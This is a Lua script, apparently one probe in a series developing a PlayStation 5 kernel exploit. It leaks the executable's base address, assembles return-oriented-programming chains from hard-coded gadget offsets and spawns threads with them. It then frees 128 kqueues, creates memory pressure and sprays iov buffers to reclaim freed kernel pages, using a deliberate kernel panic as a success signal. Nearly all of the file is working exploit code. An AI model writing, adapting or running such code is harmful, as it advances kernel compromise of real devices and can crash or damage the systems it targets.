-- CRASH_CLASS: RISKY (kernel panic if page-level reclaim works)
-- PROBE 500l: Page-level UMA reclamation + crash oracle
--
-- Context: 500k proved iov spray (general 256B) can't reclaim kqueue
-- (dedicated kq_zone). We need page-level reclaim:
--   1. Exhaust kq_zone with 128 kqueues (fill 2+ slab pages)
--   2. Start poller on kqueue #0
--   3. Close ALL 128 kqueues → kq_zone slabs empty
--   4. Trigger zone trimming (large mmap+munmap for VM pressure)
--   5. Wait for uma_reclaim to release empty kq_zone slab pages
--   6. Spray with iov (general 256B zone) → might get released pages
--   7. Wait for poll timeout → seltdclear reads from iov data
--   8. Crash oracle: si_mtx = 0x100 (unmapped) → kernel panic if reclaimed
--
-- Expected: PS5 reboots = page-level reclaim worked → the attack is viable
--           Process survives = no page-level reclaim → need different trigger

print("=== PROBE 500l: PAGE-LEVEL UMA RECLAIM + CRASH ORACLE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_pop_rcx   = eb + 0xE64
local g_bare_ret  = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 8 do wq(N(fake_tcb) + i, uint64(N(fake_tcb))) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(N(fake_tcb)))
local one_byte = memory.alloc(8)
wd(N(one_byte), 0x42)

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local function make_gate()
    local sv = memory.alloc(8)
    wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
    local r = rd(N(sv)) or 0xFFFF
    local w = rd(N(sv) + 4) or 0xFFFF
    if r == 0xFFFF or w == 0xFFFF then return nil, nil end
    return r, w
end

-- Crash value: 0x100 = unmapped first-page address
local CRASH_VAL = uint64(0x100)

-- Thread builders
local function build_poller(gate_rd, pollfd_addr, marker_addr, timeout_ms)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    emit(g_pop_rdi); emit(uint64(pollfd_addr))
    emit(g_pop_rsi); emit(uint64(1))
    emit(g_pop_rdx); emit(uint64(timeout_ms))
    emit(g_pop_rax); emit(uint64(209)); emit(stub)
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

local function build_closer_multi(gate_rd, fds, marker_addr)
    -- Close a list of fds, then write marker
    local stk = memory.alloc(0x8000)
    local sb = N(stk)
    local rsp = sb + 0x4000 - ((sb + 0x4000) % 16) - 8
    for i = 0, 0x3FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    -- sysarch(SET_FSBASE)
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    -- read gate
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    -- close each fd
    for _, fd in ipairs(fds) do
        emit(g_pop_rdi); emit(uint64(fd))
        emit(g_pop_rax); emit(uint64(6)); emit(stub)
    end
    -- write marker
    emit(g_pop_rax); emit(uint64(1))
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    -- exit
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x4000))
    return par
end

local function build_spray_child(gate_rd, sock_rd, msghdr_addr, marker_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    emit(g_pop_rax); emit(uint64(1))
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(sock_rd))
    emit(g_pop_rsi); emit(uint64(msghdr_addr))
    emit(g_pop_rdx); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(29)); emit(stub)
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

-- iov buffer: ALL qwords = CRASH_VAL (0x100)
-- iov_base=0x100 (unmapped, never used), iov_len=0x100 (256 bytes, positive)
local iov_buf = memory.alloc(256 + 16)
for q = 0, 31 do
    wq(N(iov_buf) + q * 8, CRASH_VAL)
end

local function make_msghdr()
    local mh = memory.alloc(0x30)
    wq(N(mh), uint64(0))
    wd(N(mh) + 8, 0)
    wq(N(mh) + 0x10, uint64(N(iov_buf)))
    wd(N(mh) + 0x18, 16)
    wq(N(mh) + 0x20, uint64(0))
    wd(N(mh) + 0x28, 0)
    wd(N(mh) + 0x2C, 0)
    return mh
end

-- ===== PHASE A: Create 128 kqueues (exhaust kq_zone, fill ~2 slab pages) =====
print("--- Phase A: exhaust kq_zone ---")
local sc_kqueue = mk(362)
local NUM_KQ = 128
local kq_fds = {}
for i = 1, NUM_KQ do
    local fd = sgn(sc_kqueue())
    if fd >= 0 then
        kq_fds[#kq_fds + 1] = fd
    end
end
print("  created " .. #kq_fds .. "/" .. NUM_KQ .. " kqueues")
if #kq_fds < 64 then
    print("  too few kqueues, aborting")
    for _, fd in ipairs(kq_fds) do pcall(function() mk(6)(uint64(fd)) end) end
    return
end

-- kq_fds[1] is our TARGET
local target_kq = kq_fds[1]
print("  target_kq=" .. target_kq)

-- ===== PHASE B: Start poller on target kqueue =====
print("")
print("--- Phase B: start poller ---")
local gPoll_r, gPoll_w = make_gate()
local pollfd = memory.alloc(8)
wd(N(pollfd), target_kq); wd(N(pollfd) + 4, 0x00010000) -- POLLIN
local mPoll = memory.alloc(8); wd(N(mPoll), 0); wd(N(mPoll) + 4, 0xAA)

pcall(function()
    mk(455)(build_poller(gPoll_r, N(pollfd), N(mPoll), 10000), uint64(0x38))
end)

-- Open poller gate
pcall(function() mk(4)(uint64(gPoll_w), uint64(N(one_byte)), uint64(1)) end)
-- Wait for poller to enter poll (~5ms)
for d = 1, 50000 do local _ = rd(N(mPoll)) end
print("  poller started (poll timeout=10s)")

if not alive() then print("DIED in phase B"); return end

-- ===== PHASE C: Close ALL kqueues (target first, then the rest) =====
print("")
print("--- Phase C: close all " .. #kq_fds .. " kqueues ---")

-- Close target first, then others
-- Use a closer child for the target (gated)
local gClose_r, gClose_w = make_gate()
local mClose = memory.alloc(8); wd(N(mClose), 0); wd(N(mClose) + 4, 0xBB)

-- Build list of ALL fds to close (target first)
pcall(function()
    mk(455)(build_closer_multi(gClose_r, kq_fds, N(mClose)), uint64(0x38))
end)

-- Open closer gate
pcall(function() mk(4)(uint64(gClose_w), uint64(N(one_byte)), uint64(1)) end)

-- Wait for closer to finish (up to 2s)
local close_ok = false
for w = 1, 2000000 do
    if rd(N(mClose)) ~= 0 then close_ok = true; break end
end
print("  close done: " .. tostring(close_ok))
if not alive() then print("DIED in phase C"); return end

-- ===== PHASE D: Trigger VM pressure for uma_reclaim =====
print("")
print("--- Phase D: trigger uma_reclaim ---")

-- Strategy 1: large mmap + munmap to cause VM churn
local sc_mmap = mk(477)   -- mmap
local sc_munmap = mk(73)  -- munmap

-- Allocate 64MB anonymous mapping
local big_sz = 64 * 1024 * 1024
local big_map = nil
do
    local ok, v = pcall(function()
        return sc_mmap(uint64(0), uint64(big_sz), uint64(3), uint64(0x1002),
                       uint64(0xFFFFFFFF), uint64(0))
    end)
    if ok then
        local h, l = get_hi_lo(v)
        if h < 0xFFFF8000 and l ~= 0 then
            big_map = v
        end
    end
end

if big_map then
    print("  big_map=" .. fmt(big_map))
    -- Touch pages to populate
    for off = 0, big_sz - 0x4000, 0x4000 do
        local addr = uint64(N(big_map) + off)
        pcall(function() memory.write_dword(N(addr), 0x41414141) end)
    end
    -- madvise(MADV_FREE=5) to suggest reclaim
    pcall(function() mk(75)(big_map, uint64(big_sz), uint64(5)) end)
    -- munmap to return pages
    pcall(function() sc_munmap(big_map, uint64(big_sz)) end)
    print("  mmap+touch+madvise+munmap done")
else
    print("  big_map failed, relying on timer-based reclaim")
end

if not alive() then print("DIED in phase D"); return end

-- Strategy 2: Just wait. uma_reclaim might fire from the pressure above.
print("  waiting 3 seconds for uma_reclaim...")
-- Use poll on a dummy fd with 3-second timeout as a sleep mechanism
local sleep_sv = memory.alloc(8)
wd(N(sleep_sv), 0xFFFF); wd(N(sleep_sv) + 4, 0xFFFF)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sleep_sv))) end)
local sleep_rd = rd(N(sleep_sv)) or 0xFFFF
local sleep_wr = rd(N(sleep_sv) + 4) or 0xFFFF
if sleep_rd ~= 0xFFFF then
    local sleep_pollfd = memory.alloc(8)
    wd(N(sleep_pollfd), sleep_rd); wd(N(sleep_pollfd) + 4, 0x00010000)
    pcall(function() mk(209)(uint64(N(sleep_pollfd)), uint64(1), uint64(3000)) end)
    pcall(function() mk(6)(uint64(sleep_rd)) end)
    pcall(function() mk(6)(uint64(sleep_wr)) end)
    print("  3-second wait done")
else
    -- Fallback: busy-wait
    for w = 1, 30000000 do local _ = rd(N(mPoll)) end
    print("  busy-wait done")
end

if not alive() then print("DIED in phase D wait"); return end

-- ===== PHASE E: Spray with iov (general 256B zone) =====
print("")
print("--- Phase E: iov spray (general 256B zone) ---")

local NUM_SPRAY = 8
local spray = {}
for s = 1, NUM_SPRAY do
    local sv = memory.alloc(8)
    wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
    local sr = rd(N(sv)) or 0xFFFF
    local sw = rd(N(sv) + 4) or 0xFFFF
    local gr, gw = make_gate()
    local smk = memory.alloc(8); wd(N(smk), 0); wd(N(smk) + 4, 0)
    local mh = make_msghdr()
    if sr ~= 0xFFFF and gr then
        pcall(function()
            mk(455)(build_spray_child(gr, sr, N(mh), N(smk)), uint64(0x38))
        end)
        spray[#spray + 1] = {rd=sr, wr=sw, gr=gr, gw=gw, mk=smk}
    end
end
print("  spray children=" .. #spray)

-- Open all spray gates
for _, sd in ipairs(spray) do
    pcall(function() mk(4)(uint64(sd.gw), uint64(N(one_byte)), uint64(1)) end)
end

-- Brief wait for spray to enter recvmsg
for d = 1, 300000 do local _ = rd(N(mPoll)) end

-- Count sprays that entered recvmsg
local spray_running = 0
for _, sd in ipairs(spray) do
    if rd(N(sd.mk)) ~= 0 then spray_running = spray_running + 1 end
end
print("  spray_running=" .. spray_running .. "/" .. #spray)

if not alive() then print("DIED in phase E"); return end

-- ===== PHASE F: Wait for poll timeout =====
print("")
print("--- Phase F: wait for poll timeout (up to ~10s) ---")
print("  If PS5 reboots here → PAGE-LEVEL RECLAIM WORKED")
print("  If process survives → no page-level reclaim")

for w = 1, 30000000 do
    if not alive() then break end
    if rd(N(mPoll) + 4) ~= 0xAA then break end
end

if not alive() then
    print("  PROCESS DIED (kernel panic or kill)")
    print("  If PS5 is rebooting: PAGE-LEVEL RECLAIM CONFIRMED!")
    return
end

local poll_rv = rq(uint64(N(mPoll)))
print("  poll_rv=" .. fmt(poll_rv))
print("  SURVIVED — no page-level reclaim in this run")

-- ===== Cleanup =====
for _, sd in ipairs(spray) do
    pcall(function() mk(6)(uint64(sd.rd)) end)
    pcall(function() mk(6)(uint64(sd.wr)) end)
    pcall(function() mk(6)(uint64(sd.gr)) end)
    pcall(function() mk(6)(uint64(sd.gw)) end)
end
pcall(function() mk(6)(uint64(gPoll_r)) end)
pcall(function() mk(6)(uint64(gPoll_w)) end)
pcall(function() mk(6)(uint64(gClose_r)) end)
pcall(function() mk(6)(uint64(gClose_w)) end)

print("")
print("========================================")
print("NO PAGE-LEVEL RECLAIM in this run")
print("Possible causes:")
print("  - uma_reclaim didn't fire (timer-based, up to 60s)")
print("  - kq_zone slabs not released despite being empty")
print("  - General 256B zone didn't get those specific pages")
print("  - sizeof(kqueue) puts it in a different bucket than 256B")
print("")
print("Next: try longer wait, or multiple iterations,")
print("or use sys 624 (madvise) VM counter to verify zone activity")
print("alive=" .. tostring(alive()))
print("========================================")
print("")
print("=== PROBE 500l COMPLETE ===")
